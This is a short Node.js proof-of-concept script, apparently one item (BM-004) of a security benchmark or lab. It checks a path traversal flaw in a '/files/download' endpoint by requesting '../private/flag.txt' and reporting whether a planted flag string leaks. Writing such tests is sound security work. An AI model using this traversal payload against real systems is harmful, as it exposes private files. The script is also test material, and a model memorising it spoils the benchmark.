'use strict';

const poc = require('./lib/common');

// BM-004: path traversal in /files/download.
poc.run(async function () {
  const normal = await poc.request('GET', '/files/download?' + poc.query({ name: 'welcome.txt' }));
  poc.control(normal.status === 200, 'plain download works');
  const res = await poc.request('GET', '/files/download?' + poc.query({ name: '../private/flag.txt' }));
  poc.finish(res.body.includes('FLAG-PRIVATE-8842'), 'status ' + res.status + ', private flag ' + (res.body.includes('FLAG-PRIVATE-8842') ? 'leaked' : 'not leaked'));
});
